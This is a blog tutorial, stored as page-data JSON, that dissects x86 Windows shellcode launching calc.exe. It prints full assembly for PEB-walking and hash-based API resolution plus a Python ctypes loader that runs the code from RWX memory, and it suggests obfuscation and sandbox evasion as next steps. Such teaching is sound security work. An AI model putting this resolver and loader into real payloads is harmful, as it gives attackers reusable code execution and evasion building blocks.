{"pageProps":{"postData":{"slug":"calculator-shellcode-analysis","contentHtml":"\n<p><img src=\"/images/Shellcode.png\" alt=\"Assembly code showing shellcode implementation\"></p>\n<h2>Introduction</h2>\n<p>In the realm of cybersecurity, shellcode represents one of the most fundamental building blocks for both offensive security practitioners and defensive analysts. These compact machine code sequences, traditionally designed to spawn command shells (hence the name), have evolved to perform virtually any programmatic action on a target system.</p>\n<p>I developed this analysis as part of my learning journey through the Offensive Security Exploit Developer (OSED) certification, where shellcoding is a core component of the curriculum. This article represents my practical exploration of these techniques and serves as a reference for others on a similar path.</p>\n<p>In this comprehensive analysis, we'll dissect a classic Windows shellcode example that launches the calculator application. While seemingly simple, this example serves as an excellent educational tool, demonstrating critical low-level programming techniques applicable to both security research and software development.</p>\n<pre class=\"language-none\"><code class=\"language-none\">Note: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts.\n</code></pre>\n<h2>Why Study Shellcode?</h2>\n<p>Understanding shellcode construction provides several benefits:</p>\n<ol>\n<li><strong>Security Research</strong>: Insight into exploitation techniques and vulnerability analysis</li>\n<li><strong>Malware Analysis</strong>: Ability to recognize and decode obfuscated malicious code</li>\n<li><strong>Low-Level Programming</strong>: Mastery of assembly language and operating system internals</li>\n<li><strong>System Architecture</strong>: Deeper understanding of process execution environments</li>\n<li><strong>Performance Optimization</strong>: Techniques applicable to high-performance computing</li>\n</ol>\n<p>The calculator-launching example is particularly valuable because it's benign yet demonstrates all the critical elements found in more sophisticated payloads.</p>\n<h2>The Complete Shellcode Implementation</h2>\n<p>Below is our complete x86 shellcode implementation with detailed annotations. Each section serves a specific purpose in our goal of launching the Windows calculator application without using standard library functions.</p>\n<pre class=\"language-python\"><code class=\"language-python\">import ctypes, struct           # Import necessary modules for memory manipulation\nfrom keystone import *          # Import Keystone engine for assembling code\n\nCODE = (\n    \" start:                             \"  # Beginning of shellcode\n    \"   mov   ebp, esp                  ;\"  # Stack base - save stack pointer in EBP register\n    \"   add   esp, 0xfffff9f0           ;\"  # ~1600 bytes of stack space (using negative value to avoid NULL bytes)\n    \" find_kernel32:                     \"  # Start of kernel32.dll location routine\n    \"   xor   ecx, ecx                  ;\"  # ECX = 0 (zero out register without using NULL bytes)\n    \"   mov   esi, fs:[ecx+0x30]        ;\"  # ESI = PEB (Process Environment Block via FS segment)\n    \"   mov   esi, [esi+0x0C]           ;\"  # ESI = PEB->Ldr (loader data)\n    \"   mov   esi, [esi+0x1C]           ;\"  # ESI = InInitOrder (module list in initialization order)\n    \" next_module:                       \"  # Loop marker for module iteration\n    \"   mov   ebx, [esi+0x08]           ;\"  # EBX = module base (kernel32.dll)\n    \"   mov   edi, [esi+0x20]           ;\"  # EDI = module name pointer\n    \"   mov   esi, [esi]                ;\"  # Next module in the linked list\n    \"   cmp   [edi+12*2], cx            ;\"  # Check for kernel32.dll (12th character position for NULL in Unicode)\n    \"   jne   next_module               ;\"  # If not kernel32.dll, continue to next module\n    \" find_function_shorten:             \"  # Beginning of function address resolution routine\n    \"   jmp find_function_shorten_bnc   ;\"  # Jump to call instruction (JMP/CALL/POP technique)\n    \" find_function_ret:                 \"  # Return address for the CALL instruction\n    \"   pop esi                         ;\"  # ESI = address of find_function routine (from CALL push)\n    \"   mov   [ebp+0x04], esi           ;\"  # Store find_function address for later calls\n    \"   jmp resolve_symbols_kernel32    ;\"  # Skip past the find_function code to resolution section\n    \" find_function_shorten_bnc:         \"  # Bouncer for the JMP/CALL/POP technique\n    \"   call find_function_ret          ;\"  # CALL pushes next instruction address to stack\n    \" find_function:                     \"  # Function to find API addresses by hash\n    \"   pushad                          ;\"  # Save all registers to stack\n    \"   mov   eax, [ebx+0x3c]           ;\"  # EAX = PE header offset (e_lfanew)\n    \"   mov   edi, [ebx+eax+0x78]       ;\"  # EDI = export table RVA\n    \"   add   edi, ebx                  ;\"  # Convert RVA to VA (virtual address)\n    \"   mov   ecx, [edi+0x18]           ;\"  # ECX = number of exported functions\n    \"   mov   eax, [edi+0x20]           ;\"  # EAX = RVA of function names array\n    \"   add   eax, ebx                  ;\"  # Convert names array RVA to VA\n    \"   mov   [ebp-4], eax              ;\"  # Cache function names array address\n    \" find_function_loop:                \"  # Loop through exported functions\n    \"   jecxz find_function_finished    ;\"  # If ECX=0 (no more functions), exit loop\n    \"   dec   ecx                       ;\"  # Decrement counter (loop from last to first)\n    \"   mov   eax, [ebp-4]              ;\"  # EAX = function names array address\n    \"   mov   esi, [eax+ecx*4]          ;\"  # ESI = RVA of current function name\n    \"   add   esi, ebx                  ;\"  # Convert function name RVA to VA\n    \" compute_hash:                      \"  # Begin hash calculation for function name\n    \"   xor   eax, eax                  ;\"  # Clear EAX for character loading\n    \"   cdq                             ;\"  # Clear EDX (extend sign bit of EAX to EDX) for hash value\n    \"   cld                             ;\"  # Clear direction flag (ensure string ops move forward)\n    \" compute_hash_again:                \"  # Hash calculation loop\n    \"   lodsb                           ;\"  # Load next character from ESI into AL\n    \"   test  al, al                    ;\"  # Check if character is NULL (end of string)\n    \"   jz    compute_hash_finished     ;\"  # If NULL, hash calculation complete\n    \"   ror   edx, 0x0d                 ;\"  # Rotate right hash value by 13 bits\n    \"   add   edx, eax                  ;\"  # Add character value to hash\n    \"   jmp   compute_hash_again        ;\"  # Process next character\n    \" compute_hash_finished:             \"  # Hash calculation complete\n    \" find_function_compare:             \"  # Compare calculated hash with target\n    \"   cmp   edx, [esp+0x24]           ;\"  # Compare hash with argument (pushed before PUSHAD)\n    \"   jnz   find_function_loop        ;\"  # If no match, try next function\n    \"   mov   edx, [edi+0x24]           ;\"  # EDX = RVA of ordinals table\n    \"   add   edx, ebx                  ;\"  # Convert ordinals RVA to VA\n    \"   mov   cx,  [edx+2*ecx]          ;\"  # CX = function ordinal\n    \"   mov   edx, [edi+0x1c]           ;\"  # EDX = RVA of function addresses table\n    \"   add   edx, ebx                  ;\"  # Convert addresses RVA to VA\n    \"   mov   eax, [edx+4*ecx]          ;\"  # EAX = RVA of function\n    \"   add   eax, ebx                  ;\"  # Convert function RVA to VA\n    \"   mov   [esp+0x1c], eax           ;\"  # Overwrite EAX in saved registers (via PUSHAD)\n    \" find_function_finished:            \"  # Function resolution complete\n    \"   popad                           ;\"  # Restore registers (with EAX = function address)\n    \"   ret                             ;\"  # Return to caller\n    \" resolve_symbols_kernel32:          \"  # Begin resolving specific API functions\n    \"   push  0x78b5b983                ;\"  # Push TerminateProcess hash\n    \"   call dword ptr [ebp+0x04]       ;\"  # Call find_function to resolve address\n    \"   mov   [ebp+0x10], eax           ;\"  # Store TerminateProcess address\n    \"   push  0x16b3fe72                ;\"  # Push CreateProcessA hash\n    \"   call dword ptr [ebp+0x04]       ;\"  # Call find_function to resolve address\n    \"   mov   [ebp+0x18], eax           ;\"  # Store CreateProcessA address\n    \" launch_calc:                       \"  # Begin calculator launching routine\n    \"   xor   eax, eax                  ;\"  # Clear EAX for NULL terminator\n    \"   push  eax                       ;\"  # Push NULL terminator for string\n    \"   push  0x6578652e                ;\"  # Push \".exe\" (in reverse byte order)\n    \"   push  0x636c6163                ;\"  # Push \"calc\" (in reverse byte order)\n    \"   mov   ebx, esp                  ;\"  # EBX = pointer to \"calc.exe\" string\n    \" create_startupinfoa:               \"  # Begin creating STARTUPINFO structure\n    \"   xor   eax, eax                  ;\"  # Clear EAX for multiple zero values\n    \"   push  eax                       ;\"  # hStdError = NULL\n    \"   push  eax                       ;\"  # hStdOutput = NULL\n    \"   push  eax                       ;\"  # hStdInput = NULL\n    \"   push  eax                       ;\"  # lpReserved2 = NULL\n    \"   push  eax                       ;\"  # cbReserved2 &#x26; wShowWindow = 0\n    \"   push  eax                       ;\"  # dwFlags = 0\n    \"   push  eax                       ;\"  # dwFillAttribute = 0\n    \"   push  eax                       ;\"  # dwYCountChars = 0\n    \"   push  eax                       ;\"  # dwXCountChars = 0\n    \"   push  eax                       ;\"  # dwYSize = 0\n    \"   push  eax                       ;\"  # dwXSize = 0\n    \"   push  eax                       ;\"  # dwY = 0\n    \"   push  eax                       ;\"  # dwX = 0\n    \"   push  eax                       ;\"  # lpTitle = NULL\n    \"   push  eax                       ;\"  # lpDesktop = NULL\n    \"   push  eax                       ;\"  # lpReserved = NULL\n    \"   mov   al, 0x44                  ;\"  # AL = 68 (size of STARTUPINFO structure)\n    \"   push  eax                       ;\"  # cb = 68 (first field of STARTUPINFO)\n    \"   push  esp                       ;\"  # Push pointer to STARTUPINFO\n    \"   pop   esi                       ;\"  # ESI = pointer to STARTUPINFO\n    \" call_createprocessa:               \"  # Prepare for CreateProcessA call\n    \"   mov   eax, esp                  ;\"  # Get current stack pointer\n    \"   xor   ecx, ecx                  ;\"  # Clear ECX for stack space calculation\n    \"   mov   cx, 0x390                 ;\"  # ECX = 912 bytes (space for PROCESS_INFORMATION)\n    \"   sub   eax, ecx                  ;\"  # EAX = location for PROCESS_INFORMATION\n    \"   push  eax                       ;\"  # lpProcessInformation parameter\n    \"   push  esi                       ;\"  # lpStartupInfo parameter\n    \"   xor   eax, eax                  ;\"  # Clear EAX for NULL values\n    \"   push  eax                       ;\"  # lpCurrentDirectory = NULL\n    \"   push  eax                       ;\"  # lpEnvironment = NULL\n    \"   push  eax                       ;\"  # dwCreationFlags = 0\n    \"   inc   eax                       ;\"  # EAX = 1 (avoid NULL byte)\n    \"   push  eax                       ;\"  # bInheritHandles = TRUE\n    \"   dec   eax                       ;\"  # EAX = 0 again\n    \"   push  eax                       ;\"  # lpThreadAttributes = NULL\n    \"   push  eax                       ;\"  # lpProcessAttributes = NULL\n    \"   push  ebx                       ;\"  # lpCommandLine = \"calc.exe\"\n    \"   push  eax                       ;\"  # lpApplicationName = NULL\n    \"   call  dword ptr [ebp+0x18]      ;\"  # Call CreateProcessA\n    \" exit_properly:                     \"  # Clean exit routine\n    \"   xor   ecx, ecx                  ;\"  # Clear ECX for exit code\n    \"   push  ecx                       ;\"  # uExitCode = 0\n    \"   push  0xffffffff                ;\"  # hProcess = -1 (current process)\n    \"   call  dword ptr [ebp+0x10]      ;\"  # Call TerminateProcess\n)\n\nks = Ks(KS_ARCH_X86, KS_MODE_32)        # Initialize Keystone assembler for x86 32-bit\nencoding, count = ks.asm(CODE)          # Assemble the shellcode into machine code\nprint(\"Encoded %d instructions...\" % count)  # Display count of assembled instructions\n\nsh = b\"\"                                # Initialize empty binary string\nfor e in encoding:                      # Loop through each byte of encoded shellcode\n    sh += struct.pack(\"B\", e)           # Pack byte into binary string\nshellcode = bytearray(sh)               # Convert to bytearray for memory operations\n\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),                    # Allocate memory at NULL (OS chooses address)\n                                          ctypes.c_int(len(shellcode)),        # Size of allocated memory equals shellcode size\n                                          ctypes.c_int(0x3000),                # MEM_COMMIT | MEM_RESERVE \n                                          ctypes.c_int(0x40))                  # PAGE_EXECUTE_READWRITE protection\n\nif not ptr:                             # Check if memory allocation failed\n    raise Exception(\"VirtualAlloc failed\")  # Raise exception if allocation failed\n\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # Create C-compatible buffer from shellcode\n\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),        # Copy shellcode to allocated memory\n                                     buf,                       # Source buffer\n                                     ctypes.c_int(len(shellcode)))  # Length to copy\n\nprint(\"Shellcode located at address %s\" % hex(ptr))  # Display shellcode memory address\ninput(\"...ENTER TO EXECUTE SHELLCODE...\")  # Wait for user confirmation\n\nht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),        # Default security attributes\n                                         ctypes.c_int(0),        # Default stack size\n                                         ctypes.c_int(ptr),      # Thread start address (shellcode)\n                                         ctypes.c_int(0),        # No thread parameters\n                                         ctypes.c_int(0),        # Run thread immediately\n                                         ctypes.pointer(ctypes.c_int(0)))  # Don't return thread identifier\n\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))  # Wait indefinitely for thread to finish\n</code></pre>\n<p>Now, let's analyze this code in depth to understand how each component works.</p>\n<h2>The Architecture of Position-Independent Code</h2>\n<h3>Stack Setup and Basic Initialization</h3>\n<p>The shellcode begins by establishing a stable execution environment:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">mov   ebp, esp                  # Save stack pointer\nadd   esp, 0xfffff9f0           # Create ~1600 bytes of stack space\n</code></pre>\n<p>This initial setup creates a stack frame and reserves a significant amount of space (approximately 1600 bytes) for our operations. What's interesting is the use of a negative value (<code>0xFFFFF9F0</code>) to allocate space—a technique employed to avoid NULL bytes in the shellcode, which could terminate string processing in exploits.</p>\n<p>The second component is the creation of consistent register states. This is crucial for position-independent code that must function regardless of its memory location:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">xor   ecx, ecx                  # Zero out ECX register\n</code></pre>\n<p>This simple operation clears ECX without using immediate zero values that would create unwanted NULL bytes in our shellcode.</p>\n<h3>Windows Internals: The Process Environment Block</h3>\n<p>Next, we navigate Windows internal structures to find Kernel32.dll, the gateway to most Windows API functions:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">mov   esi, fs:[ecx+0x30]        # Access PEB via FS segment register\nmov   esi, [esi+0x0C]           # PEB->Ldr (loader data)\nmov   esi, [esi+0x1C]           # InInitializationOrderModuleList\n</code></pre>\n<p>This segment delves into undocumented Windows internals. The FS segment register at offset 0x30 points to the Process Environment Block (PEB), a Windows data structure containing process information. By traversing this structure, we locate the Loader Data Table, which contains information about all loaded modules.</p>\n<p>The InInitializationOrderModuleList is particularly useful because Kernel32.dll is typically the second module in this list (ntdll.dll being the first).</p>\n<h3>Kernel32.dll Module Discovery</h3>\n<p>The next code block iterates through loaded modules to find Kernel32.dll:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">next_module:\nmov   ebx, [esi+0x08]           # Store module base address\nmov   edi, [esi+0x20]           # Get module name pointer\nmov   esi, [esi]                # Move to next module in list\ncmp   [edi+12*2], cx            # Check if it's kernel32.dll\njne   next_module               # If not, try next module\n</code></pre>\n<p>This loop examines each module in the initialization order list. For each module:</p>\n<ol>\n<li>We grab its base address (stored at offset 0x08)</li>\n<li>Retrieve a pointer to its name (offset 0x20)</li>\n<li>Move to the next module in the linked list</li>\n<li>Check a specific character in the name string (the 13th character, adjusted for Unicode)</li>\n</ol>\n<p>The comparison at <code>[edi+12*2]</code> is checking for the NULL terminator in \"kernel32.dll\" (which is 12 characters long). When found, EBX will contain Kernel32.dll's base address—our key to resolving Windows API functions.</p>\n<h2>Dynamic Function Resolution: The Heart of Shellcode</h2>\n<h3>The JMP/CALL/POP Trick for Self-Referencing</h3>\n<p>Position-independent code must know its own location, particularly to access embedded data. The shellcode uses a classic JMP/CALL/POP sequence to achieve this:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">find_function_shorten:\njmp find_function_shorten_bnc   # Jump to the CALL instruction\nfind_function_ret:\npop esi                         # ESI now has address of find_function\nmov [ebp+0x04], esi             # Store for later use\njmp resolve_symbols_kernel32    # Continue execution\nfind_function_shorten_bnc:\ncall find_function_ret          # Push return address (find_function)\n</code></pre>\n<p>This elegant technique:</p>\n<ol>\n<li>Jumps to a CALL instruction</li>\n<li>The CALL pushes the address of the next instruction (find_function) onto the stack</li>\n<li>POP retrieves this address into ESI</li>\n<li>We store this address for later function resolution calls</li>\n</ol>\n<p>This self-referencing approach is a cornerstone of shellcode development, allowing access to code sections without absolute addresses.</p>\n<h3>PE Header Navigation: Understanding the Export Table</h3>\n<p>With Kernel32.dll's base address in EBX, we can locate its export table to find function addresses:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">find_function:\npushad                          # Save all registers\nmov   eax, [ebx+0x3c]           # Get PE header offset\nmov   edi, [ebx+eax+0x78]       # Get export directory RVA\nadd   edi, ebx                  # Convert to actual address\nmov   ecx, [edi+0x18]           # Number of functions\nmov   eax, [edi+0x20]           # Array of function names\nadd   eax, ebx                  # Convert to actual address\nmov   [ebp-4], eax              # Store for iteration\n</code></pre>\n<p>This section navigates the Portable Executable (PE) file format structures:</p>\n<ol>\n<li>First, we find the PE header using the e_lfanew field at offset 0x3C</li>\n<li>Then, locate the export directory using the offset at PE+0x78</li>\n<li>From the export directory, extract:\n<ul>\n<li>The number of exported functions</li>\n<li>Pointer to the array of function names</li>\n<li>Pointers to ordinals and function addresses</li>\n</ul>\n</li>\n</ol>\n<p>These offsets are part of the documented PE file format structure, but using them directly in assembly requires familiarity with Windows internals.</p>\n<h3>Function Hash Calculation: The ROR-13 Algorithm</h3>\n<p>Instead of storing full function names (which would make the shellcode larger), we use a hashing algorithm to identify functions:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">compute_hash:\nxor   eax, eax                  # Clear accumulator\ncdq                             # Clear EDX (hash value)\ncld                             # Clear direction flag\n\ncompute_hash_again:\nlodsb                           # Load next character into AL\ntest  al, al                    # Check for null terminator\njz    compute_hash_finished     # If null, we're done\nror   edx, 0x0d                 # Rotate right by 13 bits\nadd   edx, eax                  # Add character to hash\njmp   compute_hash_again        # Process next character\n</code></pre>\n<p>This algorithm:</p>\n<ol>\n<li>Loads each character of the function name one at a time</li>\n<li>Rotates the current hash value right by 13 bits</li>\n<li>Adds the current character value</li>\n<li>Repeats until reaching the null terminator</li>\n</ol>\n<p>The result is a 32-bit hash that, while not cryptographically secure, provides sufficient uniqueness for function identification. Using function hashes instead of names makes shellcode significantly smaller and more difficult to detect through simple string scanning.</p>\n<h3>Finding the Function Address: Export Directory Navigation</h3>\n<p>After calculating a hash, we check if it matches our target function:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">find_function_compare:\ncmp   edx, [esp+0x24]           # Compare calculated hash with target\njnz   find_function_loop        # If no match, try next function\nmov   edx, [edi+0x24]           # Get ordinals table RVA\nadd   edx, ebx                  # Convert to address\nmov   cx,  [edx+2*ecx]          # Get function ordinal\nmov   edx, [edi+0x1c]           # Get function addresses table RVA\nadd   edx, ebx                  # Convert to address\nmov   eax, [edx+4*ecx]          # Get function RVA\nadd   eax, ebx                  # Convert to actual address\nmov   [esp+0x1c], eax           # Store in EAX position (for POPAD)\n</code></pre>\n<p>When a hash match is found, we:</p>\n<ol>\n<li>Get the function's ordinal from the ordinals table</li>\n<li>Use the ordinal to index into the address table</li>\n<li>Extract the function's relative virtual address (RVA)</li>\n<li>Convert the RVA to an actual virtual address by adding the module base</li>\n<li>Store the result where it will end up in EAX after POPAD</li>\n</ol>\n<p>This translation between name, ordinal, and address follows the PE export table structure, allowing us to resolve any exported function.</p>\n<h3>Resolving Required Function Addresses</h3>\n<p>With our function resolution mechanism in place, we can find the addresses of the specific functions we need:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">resolve_symbols_kernel32:\npush  0x78b5b983                # TerminateProcess hash\ncall dword ptr [ebp+0x04]       # Call find_function\nmov   [ebp+0x10], eax           # Store TerminateProcess address\npush  0x16b3fe72                # CreateProcessA hash\ncall dword ptr [ebp+0x04]       # Call find_function\nmov   [ebp+0x18], eax           # Store CreateProcessA address\n</code></pre>\n<p>Here we resolve two essential functions:</p>\n<ol>\n<li><strong>TerminateProcess</strong> (hash: 0x78b5b983) - Used for clean shellcode exit</li>\n<li><strong>CreateProcessA</strong> (hash: 0x16b3fe72) - Used to launch the calculator</li>\n</ol>\n<p>These specific hash values were pre-calculated using the same algorithm implemented in our shellcode. The resolved addresses are stored at fixed offsets from our EBP register for later use.</p>\n<h2>Crafting Dynamic Data Structures</h2>\n<h3>Creating the Program Name on the Stack</h3>\n<p>To launch calculator, we need its command line. We create this string directly on the stack:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">launch_calc:\nxor   eax, eax                  # Clear EAX register\npush  eax                       # Push null terminator (0x00000000)\npush  0x6578652e                # Push \".exe\" (reversed)\npush  0x636c6163                # Push \"calc\" (reversed)\nmov   ebx, esp                  # EBX points to \"calc.exe\"\n</code></pre>\n<p>This technique builds a null-terminated string by pushing its components backwards onto the stack. Due to x86's little-endian byte ordering, we must reverse the string segments:</p>\n<ul>\n<li>\"calc\" becomes 0x636c6163 (hex representation of ASCII values in reverse)</li>\n<li>\".exe\" becomes 0x6578652e</li>\n</ul>\n<p>After pushing these values and a null terminator, ESP points to the start of our \"calc.exe\" string, which we save in EBX.</p>\n<h3>Creating the STARTUPINFO Structure</h3>\n<p>Windows CreateProcess API requires a STARTUPINFO structure. We create this directly on the stack:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">create_startupinfoa:\nxor   eax, eax                  # Clear EAX\n# Push 16 zero values for various fields\n# [multiple pushes omitted for brevity]\nmov   al, 0x44                  # Set cb = 68 (size of STARTUPINFO)\npush  eax                       # Push structure size\nmov   esi, esp                  # ESI points to STARTUPINFO\n</code></pre>\n<p>The STARTUPINFO structure has 17 fields, most of which we set to zero for default behavior. The critical field is <code>cb</code> (the first field), which must be set to the structure's size (68 bytes).</p>\n<p>By pushing all values onto the stack, we avoid the need for a static data section, keeping our shellcode position-independent and more versatile.</p>\n<h2>Executing the Payload: Process Creation</h2>\n<h3>Preparing CreateProcessA Parameters</h3>\n<p>With our string and structure ready, we prepare to call CreateProcessA:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">call_createprocessa:\nmov   eax, esp                  # Get current stack pointer\nxor   ecx, ecx                  # Clear ECX\nmov   cx, 0x390                 # Set to 912 bytes\nsub   eax, ecx                  # Calculate space for PROCESS_INFORMATION\npush  eax                       # lpProcessInformation\npush  esi                       # lpStartupInfo\nxor   eax, eax                  # Clear EAX\npush  eax                       # lpCurrentDirectory\npush  eax                       # lpEnvironment\npush  eax                       # dwCreationFlags\ninc   eax                       # EAX = 1\npush  eax                       # bInheritHandles\ndec   eax                       # EAX = 0\npush  eax                       # lpThreadAttributes\npush  eax                       # lpProcessAttributes\npush  ebx                       # lpCommandLine = \"calc.exe\"\npush  eax                       # lpApplicationName\n</code></pre>\n<p>This segment prepares the stack with the 10 parameters required by CreateProcessA:</p>\n<ol>\n<li>First, we reserve space for the PROCESS_INFORMATION output structure (not by adjusting ESP, but by calculating an address below our current stack)</li>\n<li>Then we push parameters in reverse order (standard x86 calling convention)</li>\n<li>We use some register tricks (like INC/DEC) to avoid NULL bytes while still creating the values 0 and 1</li>\n</ol>\n<p>The care taken to avoid NULL bytes is a reminder that shellcode is often used in exploit contexts where string operations might terminate on NULL values.</p>\n<h3>Calling the API and Exiting</h3>\n<p>Finally, we call CreateProcessA and then terminate our own process:</p>\n<pre class=\"language-assembly\"><code class=\"language-assembly\">call  dword ptr [ebp+0x18]      # Call CreateProcessA\n\nexit_properly:\nxor   ecx, ecx                  # Clear ECX\npush  ecx                       # uExitCode = 0\npush  0xffffffff                # hProcess = -1 (current process)\ncall  dword ptr [ebp+0x10]      # Call TerminateProcess\n</code></pre>\n<p>The CreateProcessA call launches calculator using our prepared parameters. Then we call TerminateProcess with:</p>\n<ul>\n<li>A process handle of 0xFFFFFFFF (-1), which is a special value referring to the current process</li>\n<li>An exit code of 0, indicating successful execution</li>\n</ul>\n<h2>Shellcode Execution Environment</h2>\n<p>The Python wrapper around our shellcode performs several key functions:</p>\n<pre class=\"language-python\"><code class=\"language-python\"># Allocate executable memory\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n                                          ctypes.c_int(len(shellcode)),\n                                          ctypes.c_int(0x3000),\n                                          ctypes.c_int(0x40))\n\n# Copy shellcode to allocated memory\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n                                     buf,\n                                     ctypes.c_int(len(shellcode)))\n\n# Execute shellcode in a new thread\nht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(ptr),\n                                         ctypes.c_int(0),\n                                         ctypes.c_int(0),\n                                         ctypes.pointer(ctypes.c_int(0)))\n\n# Wait for thread completion\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))\n</code></pre>\n<ol>\n<li>\n<p><strong>Memory Allocation</strong>:</p>\n<ul>\n<li>VirtualAlloc creates a memory block with PAGE_EXECUTE_READWRITE permissions (0x40)</li>\n<li>The allocation type (0x3000) combines MEM_COMMIT and MEM_RESERVE flags</li>\n</ul>\n</li>\n<li>\n<p><strong>Shellcode Transfer</strong>:</p>\n<ul>\n<li>RtlMoveMemory copies our shellcode bytes to the allocated memory</li>\n<li>This is essentially a memcpy operation</li>\n</ul>\n</li>\n<li>\n<p><strong>Execution</strong>:</p>\n<ul>\n<li>CreateThread creates a new thread with our shellcode as the entry point</li>\n<li>WaitForSingleObject blocks until the shellcode thread completes execution</li>\n</ul>\n</li>\n</ol>\n<p>This execution model represents a simplified version of how shellcode might be deployed in a real exploit scenario, though actual exploits would inject the shellcode into a vulnerable process rather than running it directly.</p>\n<h2>Advanced Techniques and Variations</h2>\n<h3>Avoiding Bad Characters</h3>\n<p>Our shellcode carefully avoids NULL bytes (0x00), which would terminate string operations in many exploit scenarios. This is achieved through techniques like:</p>\n<ul>\n<li>Using <code>xor reg, reg</code> instead of <code>mov reg, 0</code></li>\n<li>Using two's complement values (like 0xFFFFF9F0 instead of -1600)</li>\n<li>Using <code>inc</code>/<code>dec</code> instead of direct moves for small values</li>\n<li>Constructing values indirectly</li>\n</ul>\n<p>For different exploit contexts, other characters might also need to be avoided, requiring additional shellcode engineering.</p>\n<h3>Handling ASLR and DEP Protections</h3>\n<p>Modern Windows systems implement Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). Our shellcode addresses these:</p>\n<ul>\n<li><strong>ASLR</strong>: By dynamically finding module addresses through PEB traversal rather than hardcoding</li>\n<li><strong>DEP</strong>: Our execution wrapper explicitly allocates memory with execute permissions</li>\n</ul>\n<p>In real exploit scenarios, additional techniques like Return-Oriented Programming (ROP) might be needed to bypass these protections.</p>\n<h3>Alternative Function Resolution Methods</h3>\n<p>While our shellcode uses function hashing, other approaches include:</p>\n<ol>\n<li><strong>Hardcoded offsets</strong>: For specific Windows versions (less portable)</li>\n<li><strong>Import table parsing</strong>: Finding functions by walking the Import Address Table</li>\n<li><strong>Forward searching</strong>: Scanning memory for function prologues</li>\n<li><strong>API hooking</strong>: Replacing existing API calls to intercept execution</li>\n</ol>\n<p>Each method has trade-offs in terms of size, complexity, and reliability across different system versions.</p>\n<h2>Practical Applications and Learning Extensions</h2>\n<h3>Security Research Applications</h3>\n<p>Understanding shellcode construction is invaluable for:</p>\n<ol>\n<li><strong>Exploit Development</strong>: Creating custom payloads for penetration testing</li>\n<li><strong>Vulnerability Research</strong>: Understanding the impact of memory corruption bugs</li>\n<li><strong>Malware Analysis</strong>: Recognizing shellcode patterns in malicious software</li>\n<li><strong>Intrusion Detection</strong>: Developing signatures for common shellcode techniques</li>\n</ol>\n<h3>Study Extensions</h3>\n<p>To build on this knowledge, consider exploring:</p>\n<ol>\n<li><strong>Different Architectures</strong>: Adapting techniques for x64, ARM, or MIPS</li>\n<li><strong>Alternative Payloads</strong>: Creating shellcode for different actions (file operations, networking, etc.)</li>\n<li><strong>Obfuscation Techniques</strong>: Implementing encryption or metamorphic code to evade detection</li>\n<li><strong>Sandbox Evasion</strong>: Adding environmental checks to avoid analysis environments</li>\n<li><strong>Cross-Platform Shellcode</strong>: Creating payloads that work across different operating systems</li>\n</ol>\n<h2>Conclusion</h2>\n<p>Our calculator-launching shellcode demonstrates fundamental techniques critical to understanding low-level software security:</p>\n<ol>\n<li><strong>Position-Independent Code</strong>: Operating without assumptions about memory location</li>\n<li><strong>Windows Internal Navigation</strong>: Finding key structures without API assistance</li>\n<li><strong>Dynamic Function Resolution</strong>: Locating API functions using hashing techniques</li>\n<li><strong>Stack-Based Structure Creation</strong>: Building complex data structures dynamically</li>\n<li><strong>Clean Execution Flow</strong>: Properly initializing, executing, and terminating processes</li>\n</ol>\n<p>These techniques transcend the simple example presented here, forming the foundation for both offensive security research and defensive analysis. Whether you're studying malware, developing exploits for legitimate security testing, or simply seeking a deeper understanding of how software interacts with operating systems, shellcode analysis provides unique insights unavailable through higher-level programming approaches.</p>\n<p>By mastering these concepts, you gain not just technical skills but also a deeper appreciation for the intricate dance between code, memory, and the operating system that underpins all computer security.</p>\n<hr>\n<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>\n","excerpt":"In the realm of cybersecurity, shellcode represents one of the most fundamental building blocks for both offensive security practitioners and defensive analy...","title":"Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development","date":"2025-03-18","tags":["Shellcode","Assembly","Windows","Exploit Development"]}},"__N_SSG":true}